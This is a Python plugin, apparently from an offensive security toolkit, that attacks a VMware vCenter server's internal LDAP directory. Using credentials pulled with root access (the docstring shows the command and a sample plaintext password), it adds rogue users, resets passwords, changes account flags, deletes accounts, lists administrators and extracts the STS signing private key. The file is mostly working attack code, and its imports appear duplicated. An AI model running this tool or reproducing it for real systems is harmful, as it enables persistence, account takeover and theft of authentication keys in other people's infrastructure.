import argparse
from copy import copy

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes
import argparse
import random
import string
from copy import copy
from urllib.parse import unquote

import ldap3
from ldap3 import Connection

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterLdapAddUser(PluginVCenterBase):
    display = "VCenter ldap add user"
    alias = "vc_ad_user"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", dest="address")
        parser.add_argument("-d", "--domain", help="domain name(test.lab)", required=True, dest="domain")
        parser.add_argument("-u", "--username", help="username", required=True, dest="username")
        parser.add_argument("-p", "--password", help="password", required=True, dest="password")
        parser.add_argument("--new-user", help="new username", required=True, dest="new_user")
        parser.add_argument("--new-pass", help="password", required=False, dest="new_pass")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ip = args.address
        domain = args.domain
        username = args.username
        password = args.password
        new_user = args.new_user
        new_pass = args.new_pass

        if new_pass is None:
            new_pass = ''.join(random.choices(string.ascii_uppercase, k=2)) + '@' + ''.join(
                random.choices(string.ascii_letters, k=5)) + ''.join(random.choices(string.digits, k=5))

        vc = VCLdap(ip, domain, username, password)
        vc.add_user(new_user, new_pass)

        return result


class VCLdap:
    """
    利用ldap对vCenter系统域用户进行操作
    ldap凭据可通过以下命令获取(需要root权限)
    /opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'

    root@localhost [ ~ ]# /opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'
    +  "Arguments"         REG_SZ          "/usr/lib/vmware-vmdir/sbin/vmdird -s -l 0 -f /usr/lib/vmware-vmdir/share/config/vmdirschema.ldif"
    +  "Autostart"         REG_DWORD       0x00000001 (1)
    +  "dcAccount"         REG_SZ          "192.168.100.62"
    +  "dcAccountDN"       REG_SZ          "cn=192.168.100.62,ou=Domain Controllers,dc=vsphere,dc=local"
    +  "dcAccountPassword" REG_SZ          "N3P;0!Fp/cJP*~ir9%~|"
    +  "DirtyShutdown"     REG_DWORD       0x00000000 (0)
    +  "LduGuid"           REG_SZ          "82e1c057-678f-4793-9600-efc20b2b3407"
    +  "MachineGuid"       REG_SZ          "e69c362a-1e76-41d7-a759-dd43270a0bbd"
    +  "SiteGuid"          REG_SZ          "17bb1ae7-4b6a-4050-af7d-45293b59f255"
       "Dependencies"      REG_SZ          "vmafd"
       "Description"       REG_SZ          "VMware Directory Service"
       "Environment"       REG_SZ          ""
       "Path"              REG_SZ          "/usr/lib/vmware-vmdir/sbin/vmdird"
       "Type"              REG_DWORD       0x00000001 (1)
    """

    def __init__(self, addr, domain, account, passwd):
        self.conn = Connection(addr, f"CN={account},CN=Users,DC={domain.split('.')[-2]},DC={domain.split('.')[-1]}", passwd, auto_bind=True)

        base_dn = ''
        resp = self.conn.search(search_base=base_dn,
                                search_filter='(objectClass=*)',
                                search_scope='BASE',
                                attributes=['namingContexts'])

        self.nc = dict(self.conn.response[0]['attributes'])['namingContexts'][0]

    def add_user(self, username, passwd, machine_user=False):
        output.info(f'新增用户: {username} 密码: {passwd}')
        user_dn = f'cn={username},cn=Users,{self.nc}'
        obj_class = 'user'
        attrs = {
            'cn': username,
            'samAccountName': username,
            'userPrincipalName': username + '@' + self.nc.replace('dc=', '').replace(',', '.'),
            'userPassword': passwd
        }
        self.conn.add(
            user_dn,
            obj_class,
            attrs
        )
        output.info(self.conn.result)

    def add_machine_user(self, username, passwd):
        user_dn = f'cn={username},ou=Computers,{self.nc}'
        obj_class = 'computer'
        attrs = {
            'cn': username,
            'samAccountName': username,
            # 'userPrincipalName': username + '@' + self.nc.replace('dc=', '').replace(',', '.'),
            'userPassword': passwd
        }
        self.conn.add(
            user_dn,
            obj_class,
            attrs
        )

    def change_pass(self, username, new_pass):
        output.info(f'用户 {username} 密码重置为 {new_pass}')
        self.conn.modify(
            f'cn={username},cn=users,{self.nc}',
            changes={
                'userPassword': (ldap3.MODIFY_REPLACE, [new_pass])
            }
        )
        output.success(self.conn.result)

    def change_uac(self, username, value):
        self.conn.modify(
            f'cn={username},cn=users,{self.nc}',
            changes={
                'userAccountControl': (ldap3.MODIFY_REPLACE, [value])
            }
        )
        output.info(self.conn.response)
        pass

    def detete_user(self, username):
        output.info(f'删除用户: {username}')
        self.conn.delete(f'cn={username},cn=users,{self.nc}')
        output.info(self.conn.result)

    def query_acl(self):
        sb = f'cn=AclModel,cn=VmwAuthz,cn=services,{self.nc}'
        sf = f'(objectClass=vmwAuthzAclMap)'
        self.conn.search(
            search_base=sb,
            search_filter=sf,
            search_scope='SUBTREE',
            attributes=['vmwAuthzPermissionRoleId']
        )
        for entry in self.conn.response:
            parsed_dn = unquote(entry['dn']).split(',')
            dn_parts = parsed_dn[0].strip('cn=').split('@')
            attrs = ['principalName', 'propagate', 'docuri']
            output.info(dict(entry['attributes']))
        # self.conn.response

    def get_roles(self):
        pass

    def get_private_key(self):
        search_filter = '(objectclass=vmwSTSTenantCredential)'
        STS_PRIV_KEY = 'vmwSTSPrivateKey'
        USER_CERT = 'userCertificate'
        self.conn.search(
            search_base=self.nc,
            search_scope='SUBTREE',
            search_filter=search_filter,
            attributes=[STS_PRIV_KEY, USER_CERT]
        )

        for entry in self.conn.response:
            item = dict(entry['attributes'])
            for k, v in item.items():
                output.info(k, v)

    def query_admins(self):
        search_filter = '(&(objectClass=vmwAuthzAclMap)(vmwAuthzPermissionRoleId=-1))'
        self.conn.search(
            search_base=self.nc,
            search_scope='SUBTREE',
            search_filter=search_filter,
            attributes=['vmwAuthzPrincipalName']
        )
        output.info('vCenter Admins(-1)')
        for enrty in self.conn.response:
            output.info(dict(enrty['attributes']).get('vmwAuthzPrincipalName'))

